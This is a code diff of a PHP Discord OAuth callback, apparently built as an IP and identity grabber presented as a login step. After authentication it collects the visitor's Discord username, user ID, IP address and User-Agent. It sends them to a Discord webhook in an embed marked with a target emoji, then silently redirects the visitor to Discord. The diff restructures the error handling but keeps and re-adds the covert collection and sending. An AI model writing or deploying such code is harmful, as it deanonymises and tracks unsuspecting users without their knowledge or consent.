@@ -26,43 +26,38 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
 $token_raw = curl_exec($ch);
 $token_res = json_decode($token_raw, true);
 
-// エラーチェック
-if (!isset($token_res['access_token'])) {
-    echo "<h3>Access Token Error</h3>";
-    echo "Response: " . htmlspecialchars($token_raw);
-    exit;
-}
-
 // 2. ユーザー情報の取得
-$ch = curl_init('https://discord.com/api/users/@me');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $token_res['access_token']]);
-$user = json_decode(curl_exec($ch), true);
+if (isset($token_res['access_token'])) {
+    $ch = curl_init('https://discord.com/api/users/@me');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $token_res['access_token']]);
+    $user = json_decode(curl_exec($ch), true);
 
-// 3. IPアドレスとデバイス情報の取得
-$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
-$ua = $_SERVER['HTTP_USER_AGENT'];
+    // 3. IPアドレスとデバイス情報の取得
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
+    $ua = $_SERVER['HTTP_USER_AGENT'];
 
-// 4. Discord Webhookへ送信
-$payload = json_encode([
-    "embeds" => [[
-        "title" => "🎯 認証成功 (Railway版)",
-        "color" => 5814783,
-        "fields" => [
-            ["name" => "👤 ユーザー名", "value" => $user['username'] ?? 'Unknown', "inline" => true],
-            ["name" => "🆔 User ID", "value" => $user['id'] ?? 'Unknown', "inline" => true],
-            ["name" => "🌐 IPアドレス", "value" => $ip, "inline" => false],
-            ["name" => "📱 デバイス情報", "value" => "```" . $ua . "```", "inline" => false]
-        ],
-        "timestamp" => date("c")
-    ]]
-]);
+    // 4. Discord Webhookへ送信
+    $payload = json_encode([
+        "embeds" => [[
+            "title" => "🎯 認証成功 (Railway版)",
+            "color" => 5814783,
+            "fields" => [
+                ["name" => "👤 ユーザー名", "value" => $user['username'] ?? 'Unknown', "inline" => true],
+                ["name" => "🆔 User ID", "value" => $user['id'] ?? 'Unknown', "inline" => true],
+                ["name" => "🌐 IPアドレス", "value" => $ip, "inline" => false],
+                ["name" => "📱 デバイス情報", "value" => "```" . $ua . "```", "inline" => false]
+            ],
+            "timestamp" => date("c")
+        ]]
+    ]);
 
-$ch = curl_init($webhook_url);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $payload); // ← ここを修正しました！
-curl_exec($ch);
+    $ch = curl_init($webhook_url);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    curl_exec($ch);
+}
 
 // 5. 完了後にDiscordへリダイレクト
 header("Location: https://discord.com/channels/@me");
